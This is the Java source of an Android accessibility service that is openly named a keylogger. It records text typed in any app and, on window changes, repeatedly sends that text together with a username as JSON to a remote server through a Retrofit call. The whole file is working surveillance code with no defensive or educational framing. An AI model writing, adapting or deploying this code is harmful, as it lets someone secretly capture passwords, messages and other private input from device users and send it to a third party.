package com.sg.keylogger.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.google.gson.JsonObject;
import com.sg.keylogger.services.network.CallService;
import com.sg.keylogger.services.network.RetrofitInstance;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class KeyLogger extends AccessibilityService {
    String eventText = "";
    String oldText="";
    public static boolean enable=false;
    public static String username;
    List<CharSequence> dismiss=new ArrayList<>();
    List<CharSequence> available=new ArrayList<>();
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if(enable){
            final int eventType = event.getEventType();
            if(eventType==AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
                eventText = event.getText().toString();
            }
            if(eventType==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
                if(!(event.getText().toString().equals(dismiss.toString())||event.getText().toString().equals(available.toString()))){
                    if(!eventText.equals(oldText)&&(!eventText.equals(""))){
                        ScheduledExecutorService scheduleTaskExecutor = Executors.newScheduledThreadPool(5);
                        scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
                            public void run() {
                                Log.i("ACCESSIBILITYSERVICE:", eventText);
                                sendData(eventText);
                                oldText=eventText;
                            }
                        }, 0, 10, TimeUnit.SECONDS);
                    }
                }

            }
        }
    }


    public void sendData(String input){
        JsonObject jsonObject = new JsonObject();
        try {
            jsonObject.addProperty("username", username);
            jsonObject.addProperty("data",input);
        } catch (Exception e) {
            e.printStackTrace();
        }
        CallService callService= RetrofitInstance.getService();
        Call<ResponseBody> call=callService.dataPost(jsonObject);
        Log.d("Res",jsonObject.toString());
        call.enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                if(response.code()==200){
                    Log.d("ResData","Successful");
                }
                else{
                    Log.d("ResData","Error!");
                }
            }
            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                Log.d("ResData","Error!");
            }
        });
    }

    @Override
    public void onInterrupt() {
        //whatever
    }

    @Override
    public void onServiceConnected() {
        //configure our Accessibility service
        AccessibilityServiceInfo info=getServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        dismiss.add("Alternatives are dismissed");
        available.add("Alternatives are available");
        this.setServiceInfo(info);
    }

}
